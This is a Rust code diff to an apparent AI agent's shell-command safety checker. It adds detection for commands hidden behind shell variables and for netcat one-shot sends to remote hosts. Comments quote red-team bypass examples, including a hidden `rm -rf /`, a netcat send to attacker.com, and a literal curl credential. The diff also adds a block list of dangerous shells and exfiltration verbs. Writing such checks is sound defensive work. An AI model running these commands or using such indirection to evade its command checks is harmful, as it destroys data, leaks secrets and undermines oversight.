@@ -1128,6 +1128,43 @@ impl SafetyChecker {
             }
         }
 
+        // Command-position variable indirection (red-team: `cmd='sh'; $cmd
+        // -c 'rm -rf /'` — the verb hides behind `$cmd`, so every pattern
+        // above sees only a variable reference). Resolve same-command
+        // LITERAL assignments and re-run both pattern batteries on the
+        // expanded CHECK-ONLY copy. Additive: the original forms are still
+        // checked, so expansion can only add refusals — whatever fires on
+        // the literal form fires on the indirect form (rule-5 sweep: this
+        // covers the destructive-command, exfil, and netcat rules alike).
+        let expanded_cmd = expand_command_word_vars(cmd);
+        let expanded_forms = if expanded_cmd != cmd {
+            let exp_masked = normalize_shell_command_masked(&expanded_cmd);
+            let exp_masked_ifs = expand_ifs_for_matching(&exp_masked);
+            for (pattern, description) in DANGEROUS_COMMAND_PATTERNS.iter() {
+                if pattern.is_match(&exp_masked) || pattern.is_match(&exp_masked_ifs) {
+                    return Err(SelfwareError::Safety(
+                        SafetyError::DangerousCommandPattern {
+                            description: (*description).to_string(),
+                        },
+                    ));
+                }
+            }
+            let exp_normalized = normalize_shell_command(&expanded_cmd);
+            let exp_dequoted = dequote_and_lowercase(&exp_normalized);
+            for (pattern, description) in PAYLOAD_COMMAND_PATTERNS.iter() {
+                if pattern.is_match(&exp_normalized) || pattern.is_match(&exp_dequoted) {
+                    return Err(SelfwareError::Safety(
+                        SafetyError::DangerousCommandPattern {
+                            description: (*description).to_string(),
+                        },
+                    ));
+                }
+            }
+            Some(exp_normalized)
+        } else {
+            None
+        };
+
         // curl/wget `-u user:password` with a LITERAL password (red-team:
         // `curl -u user:bbp_… https://api.bitbucket.org/2.0/user`). The
         // credential-var patterns only see $VAR forms; a literal inline
@@ -1227,6 +1264,29 @@ impl SafetyChecker {
             }
             for spec in extract_shell_volume_specs(&normalized) {
                 self.check_volume_mount(&spec)?;
+            }
+        }
+
+        // nc/ncat/netcat as a one-shot send (`-q`: quit after stdin EOF —
+        // the scripted-exfil shape) to a NON-loopback host (red-team:
+        // `nc -w 3 -q attacker.com 4444`). Flag arguments (`-w 3`) defeat
+        // the pipe/stdin regexes for the un-piped form, and no regex can
+        // exempt loopback, so this scans per pipeline segment in code.
+        // Bare `nc host port` connect probes stay allowed (corpus-triaged:
+        // OS permissions are the control there); the data-carrying forms —
+        // piped stdin (pattern table) and the `-q` one-shot — are the exfil
+        // class. Also scanned on the variable-expanded form above.
+        for form in std::iter::once(&normalized).chain(expanded_forms.iter()) {
+            for segment in split_shell_pipeline(form) {
+                if let Some(host) = netcat_oneshot_remote_host(segment) {
+                    return Err(SelfwareError::Safety(
+                        SafetyError::DangerousCommandPattern {
+                            description: format!(
+                                "netcat one-shot send to non-loopback host {host} (exfiltration channel)"
+                            ),
+                        },
+                    ));
+                }
             }
         }
 
@@ -3414,6 +3474,146 @@ pub fn shell_tee_write_targets(cmd: &str) -> Vec<String> {
         }
     }
     targets
+}
+
+/// Expand command-position `$VAR`/`${VAR}` references whose same-command
+/// LITERAL assignment (`VAR=word`, quotes tolerated) names a DANGEROUS
+/// COMMAND WORD (see [`DANGEROUS_COMMAND_WORD_VALUES`]) into a CHECK-ONLY
+/// copy of the command (red-team: `cmd='sh'; $cmd -c 'rm -rf /'` — the verb
+/// hides behind a variable, so the dangerous-pattern battery only sees
+/// `$cmd`). Only single-token literal values resolve (`[\w./+-]+`), and only
+/// when the value's basename is a known dangerous verb — path/scratch
+/// variables (`T=/tmp/; rm -rf ${T}*`, corpus benign controls) stay opaque.
+/// `$(…)` substitutions and expansions of other variables never resolve, so
+/// `command=$(echo 'find …'); $command` (corpus benign control) is
+/// untouched. The caller runs the pattern batteries on BOTH the original
+/// and the expanded form — expansion is additive and can never turn a
+/// refusal into an allow.
+fn expand_command_word_vars(cmd: &str) -> String {
+    static LITERAL_ASSIGNMENT: LazyLock<Regex> = LazyLock::new(|| {
+        // No backreferences in rust-regex — the value alternation spells
+        // single-quoted, double-quoted, and bare words out (groups 2/3/4).
+        Regex::new(
+            r#"(?:^|[;|&()]|\|\||&&)\s*(?:export\s+|local\s+|declare\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=(?:'([\w./+-]+)'|"([\w./+-]+)"|([\w./+-]+))"#,
+        )
+        .expect("Invalid regex")
+    });
+    let mut out = cmd.to_string();
+    for cap in LITERAL_ASSIGNMENT.captures_iter(cmd) {
+        let name = &cap[1];
+        let value = cap
+            .get(2)
+            .or_else(|| cap.get(3))
+            .or_else(|| cap.get(4))
+            .expect("value alternation always matches")
+            .as_str();
+        // Case-folded like every other matching form in the checker (the
+        // expanded copy is normalized/lowercased before the batteries run).
+        if !DANGEROUS_COMMAND_WORD_VALUES
+            .contains(&command_basename(value).to_ascii_lowercase().as_str())
+        {
+            continue;
+        }
+        // Substitute the reference after any token boundary (start,
+        // separator, subshell open, whitespace) — command position
+        // (`$cmd -c …`) and argument position alike. The expanded copy is
+        // only ever matched against, never executed, so substituting a
+        // single-token literal inside prose is harmless: a benign value
+        // cannot complete a dangerous pattern on its own.
+        let reference = Regex::new(&format!(
+            r"(^|[;|&(\s])\$(?:\{{{}\}}|{}\b)",
+            regex::escape(name),
+            regex::escape(name)
+        ))
+        .expect("Invalid regex");
+        out = reference
+            .replace_all(&out, format!("${{1}}{value}"))
+            .into_owned();
+    }
+    out
+}
+
+/// Variable VALUES that make a `$VAR` command word worth expanding (see
+/// [`expand_command_word_vars`]): shells, interpreters, and the
+/// destructive/exfil verbs from the red-team hole class (`nc`, `dd`, …).
+/// Compared against the value's basename so `/bin/sh` resolves too.
+const DANGEROUS_COMMAND_WORD_VALUES: &[&str] = &[
+    // Shells — the confirmed hole class (`$cmd -c '<payload>'`).
+    "sh", "bash", "zsh", "dash", "ksh", "ash", "csh", "tcsh", "fish",
+    // Interpreters (payload via `-c`/`-e`/`-r`).
+    "python", "python2", "python3", "perl", "ruby", "php", "node", "deno", "bun",
+    // Destructive / exfil verbs (sweep: the same indirection against the
+    // destructive-command and exfil rules).
+    "nc", "ncat", "netcat", "dd", "mkfs", "shred", "rm", "curl", "wget", "base64",
+];
+
+/// Whether a hostname token names loopback (`localhost`, `127.x`, `::1`) —
+/// nc dev workflows against local services stay allowed.
+fn is_loopback_host(host: &str) -> bool {
+    let bare = host.trim_matches(['[', ']']);
+    bare.trim_end_matches('.') == "localhost" || bare == "::1" || bare.starts_with("127.")
+}
+
+/// The remote host of an nc/ncat/netcat ONE-SHOT send to a HOSTNAME, if
+/// this pipeline segment is one: the `-q` flag (quit after stdin EOF — the
+/// scripted fire-and-forget exfil shape) plus a non-loopback hostname
+/// operand followed by a numeric port. Flag arguments (`-w 3`) are skipped
+/// by shape: purely numeric tokens are ports/flag values, the first
+/// non-numeric operand is the host. Two classes stay allowed, both
+/// corpus-triaged benign controls: bare connect probes (no `-q` — OS
+/// permissions are the control) and `-q` sends to IP LITERALS
+/// (`nc -q -w 1 10.0.0.5 4444` — internal collectors/dev services). The
+/// refused shape is the one-shot send to a NAMED endpoint
+/// (`nc -w 3 -q attacker.com 4444`).
+fn netcat_oneshot_remote_host(segment: &str) -> Option<String> {
+    let tokens = shlex::split(segment)?;
+    let cmd_idx = command_word_index(&tokens)?;
+    if !matches!(command_basename(&tokens[cmd_idx]), "nc" | "ncat" | "netcat") {
+        return None;
+    }
+    let mut has_q = false;
+    let mut host: Option<&str> = None;
+    let mut port_after_host = false;
+    let mut flags_done = false;
+    for tok in &tokens[cmd_idx + 1..] {
+        if is_shell_metachar_token(tok) {
+            break;
+        }
+        if tok == "--" {
+            flags_done = true;
+            continue;
+        }
+        if !flags_done && tok.starts_with('-') && tok.len() > 1 {
+            // Combined flags count too (`-lq`, `-q0`); long flags like
+            // `--wait` contain no bare `q` after the dashes… `--q` does.
+            let letters = tok.trim_start_matches('-');
+            if letters.contains('q') {
+                has_q = true;
+            }
+            continue;
+        }
+        let numeric = tok.bytes().all(|b| b.is_ascii_digit());
+        match host {
+            None => {
+                if !numeric {
+                    host = Some(tok);
+                }
+            }
+            Some(_) => {
+                if numeric {
+                    port_after_host = true;
+                }
+            }
+        }
+    }
+    if !has_q || !port_after_host {
+        return None;
+    }
+    let host = host?;
+    if is_loopback_host(host) || host.parse::<std::net::IpAddr>().is_ok() {
+        return None;
+    }
+    Some(host.to_string())
 }
 
 /// File verbs whose non-flag operands are file targets by their own
